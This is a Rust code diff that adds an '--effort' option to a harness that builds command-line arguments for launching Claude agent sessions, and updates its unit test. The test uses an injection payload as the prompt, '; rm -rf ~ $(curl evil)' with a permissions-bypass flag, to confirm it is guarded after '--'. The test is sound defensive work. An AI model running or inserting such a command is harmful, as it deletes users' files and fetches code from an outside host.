@@ -3,12 +3,14 @@
 use pwf_application::pending_work::session::{AgentLaunch, AgentProbe, ClaudeSessionClient};
 
 use super::{argv::LaunchArgv, probe};
+use crate::session::claude_effort::ClaudeEffort;
 
 const BINARY: &str = "claude";
 
 struct ClaudeLaunchPlan {
     title: String,
     model: Option<String>,
+    effort: ClaudeEffort,
     prompt: String,
 }
 
@@ -17,6 +19,7 @@ impl From<&AgentLaunch> for ClaudeLaunchPlan {
         Self {
             title: launch.title.clone(),
             model: launch.model.clone(),
+            effort: launch.effort.into(),
             prompt: launch.prompt.clone(),
         }
     }
@@ -45,12 +48,14 @@ impl ClaudeHarness {
         let ClaudeLaunchPlan {
             title,
             model,
+            effort,
             prompt,
         } = ClaudeLaunchPlan::from(launch);
         let mut argv = LaunchArgv::new(BINARY).flag("--name", title);
         if let Some(model) = model {
             argv = argv.flag("--model", model);
         }
+        argv = argv.flag("--effort", effort.as_str().to_string());
         PreparedClaudeLaunch {
             argv: argv.into_guarded(prompt),
         }
@@ -86,7 +91,7 @@ impl PreparedClaudeLaunch {
 
 #[cfg(test)]
 mod tests {
-    use pwf_application::pending_work::session::{Agent, AgentLaunch};
+    use pwf_application::pending_work::session::{Agent, AgentLaunch, SessionEffort};
 
     use super::ClaudeHarness;
 
@@ -99,6 +104,7 @@ mod tests {
             repository: "/repo/pwf".to_string(),
             prompt: "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions".to_string(),
             model: Some("sonnet".to_string()),
+            effort: SessionEffort::XHigh,
         };
 
         let prepared = ClaudeHarness::prepare(&launch);
@@ -111,6 +117,8 @@ mod tests {
                 "--dangerously-skip-permissions",
                 "--model",
                 "sonnet",
+                "--effort",
+                "xhigh",
                 "--",
                 "; rm -rf ~ $(curl evil)\n--dangerously-skip-permissions",
             ]
